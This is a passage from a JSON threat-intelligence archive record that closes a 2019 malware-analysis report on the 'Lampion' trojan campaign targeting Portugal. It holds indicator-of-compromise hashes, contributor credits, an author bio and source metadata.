6251f91df9730315ae4b354e839f0\n8802e4b1a460d8f8b369928ed6379f800a1053506c33b3422c52d4c30628b560\nde8d3218d1509d255da05f3e3c1846a92d82badddbcebffd5e721256d7635fd5\naad423e2956e0f5b3fabe3b6ac624c929533acd9f2c93ecd210227a9b13a36f7\n8f04e52d69b1bdd7e4d6877ce0841ba8779f7649c16712d9d962044b2409b482\nbc4ed9ef17e608a4b00ab3b5f0c2cfe956275eb0106a9b5b82076ce2c64cfb15\nf36406b797ab4f739d0a6add29fdf72289c70019b5200ebdce78b3d3db0d79dc\n8ac60cd9bc9a44e558e840a6bebdd27c73a9ce167a66cf6c8d462e46848fe8a3\n29eeba2cbe0f3f6b119ebcc33f23d13964af26ee744419711aa24c6110c1510a\n9a2f575d77cc03afe1230666ed23c1da58dd1644abf02e2487c6cd0db8b2a26d\n73edad845ab2ba5aa55ac7757c8ff19072cba49dc44d811710858e1e42d6763d\n33f6daf3ee3b851800b5928b41fc208ac915d5ec2ffb3ebe13490c474c6cef58\nedf3b71d1f4e7adae5b58a8f3f865882b5851d3d5e6ef142643eb3ea2066efe1\n0604586fcea208bcb4350d7dd9d5c250702f1a0e9ec0d6801b272ace6918d34c\nf90ff089745109a3d59f8ba05d33547ae27df08cc269644ba1a41c9b9fcb782c\n2298b7ee6aeb19cd6c9e2f3ae6377e1cf5aab0d2d3f3102d4d51683c79a91da8\n4494da2105572a5ad07bd08110e35045c34967306f12a7ea7c91fffc0f79f599\n113232ed76536c2255f972f4bb2e3d2aafd01b643da83a04eb80f1809729a898\n\n## Thank you to all who have contributed:\n\n```\n‚Äì Corsin Camichel @cocaman\n\n‚Äì David Montenegro @CryptoInsane\n\n\n-----\n\n[Pedro Tavares](https://seguranca-informatica.pt/author/pipocaz/)\n**[Pedro Tavares is a professional in the field of information security working as an Ethical](https://www.linkedin.com/in/sirpedrotavares/)**\nHacker/Pentester, Malware Researcher and also a Security Evangelist. He is also a founding\nmember at CSIRT.UBI and Editor-in-Chief of the security computer blog segurancainformatica.pt.\n\nIn recent years he has invested in the field of information security, exploring and analyzing a\nwide range of topics, such as pentesting (Kali Linux), malware, exploitation, hacking, IoT and\nsecurity in Active Directory networks. He is also Freelance Writer (Infosec. Resources\n[Institute and Cyber Defense Magazine) and developer of the 0xSI_f33d ‚Äì a feed that](https://feed.seguranca-informatica.pt/)\ncompiles phishing and malware campaigns targeting Portuguese citizens.\n\n[Read more here.](https://seguranca-informatica.pt/contacto/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-12-26 - Targeting Portugal- A new trojan ‚ÄòLampion‚Äô has spread using template emails from the Portuguese Government Finance & Tax.pdf"
    ],
    "report_names": [
        "2019-12-26 - Targeting Portugal- A new trojan ‚ÄòLampion‚Äô has spread using template emails from the Portuguese Government Finance & Tax.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535916,
    "ts_updated_at": 1743041158,
    "ts_creation_date": 1653774403,
    "ts_modification_date": 1653774403,
    "files": {
        "pdf": "https://archive.orkl.eu/16a5e4ddbfe97b7e9dd986ad815105ef745ce9c2.pdf",
        "text": "https://archive.orkl.eu/16a5e4ddbfe97b7e9dd986ad815105ef745ce9c2.txt",
        "img": "https://archive.orkl.eu/16a5e4ddbfe97b7e9dd986ad815105ef745ce9c2.jpg"
    }
}